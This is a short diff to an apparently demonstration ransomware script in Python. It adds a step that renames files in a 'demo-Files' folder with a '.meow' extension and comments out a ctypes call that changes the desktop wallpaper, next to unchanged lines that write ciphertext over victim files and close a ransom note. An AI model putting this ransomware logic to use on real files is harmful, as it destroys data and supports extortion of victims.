@@ -48,7 +48,17 @@ for file in files:
     victimFile.write(ciphertext)
     victimFile.close()
 
-# Muahahaha!!!
+
+###########################################################################
+# Add a custom Extension to all files:
+###########################################################################
+
+# Add Custom extension:
+for file in files:
+    old_file = os.path.join("demo-Files", file)
+    new_file = os.path.join("demo-Files", "{filename}.meow".format(filename = file))
+    os.rename(old_file, new_file)
+
 
 
 ###########################################################################
@@ -63,8 +73,8 @@ ransomNote.close()
 ###########################################################################
 # Change Desktop Wallpaper:
 ###########################################################################
-path = "meow_tmp.png"
-ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
+#path = "meow_tmp.png"
+#ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
 
 
 ###########################################################################
